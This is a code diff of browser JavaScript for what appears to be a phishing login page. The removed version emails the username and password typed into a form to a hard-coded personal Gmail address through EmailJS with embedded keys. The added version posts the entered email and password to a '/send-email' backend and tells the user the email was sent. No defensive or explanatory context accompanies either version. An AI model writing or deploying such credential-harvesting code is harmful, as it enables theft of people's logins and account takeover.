@@ -1,48 +1,28 @@
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.1.0/dist/email.min.js"></script>
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
 
-<script>
-  // Initialize EmailJS with your public key
-  emailjs.init('rbzxQsqsqS1lbs8Y1'); // Replace with your actual public key
+    // Get the email and password from the form
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-  // Get form elements
-  const subjectInput = document.getElementById('Username');
-  const messageInput = document.getElementById('Password');
-  const sendBtn = document.getElementById('sendBtn');
-  const statusDiv = document.getElementById('status');
-
-  // Enable the send button only if both inputs have values
-  subjectInput.addEventListener('input', enableSendButton);
-  messageInput.addEventListener('input', enableSendButton);
-
-  function enableSendButton() {
-    sendBtn.disabled = !(subjectInput.value.trim() && messageInput.value.trim());
-  }
-
-  // Handle form submission
-  document.getElementById('emailForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    const emailData = {
-      to_email: 'kaioadrik08@gmail.com', // Replace with recipient's email
-      subject: subjectInput.value.trim(),
-      message: messageInput.value.trim()
-    };
-
-    // Show "Sending..." status
-    statusDiv.textContent = 'Sending...';
-    statusDiv.classList.remove('success', 'error');
-
-    // Send email via EmailJS
-    emailjs.send('service_774xxto', 'template_i2dsm05', emailData)
-      .then(response => {
-        console.log('Success:', response);
-        statusDiv.textContent = 'Message sent successfully!';
-        statusDiv.classList.add('success');
-      })
-      .catch(error => {
-        console.error('Failed:', error);
-        statusDiv.textContent = 'Failed to send message!';
-        statusDiv.classList.add('error');
-      });
-  });
-</script>
+    // Send the email and password to the backend
+    fetch('/send-email', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ email, password })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('Email sent successfully!');
+        } else {
+            alert('Failed to send email.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('An error occurred while sending the email.');
+    });
+});
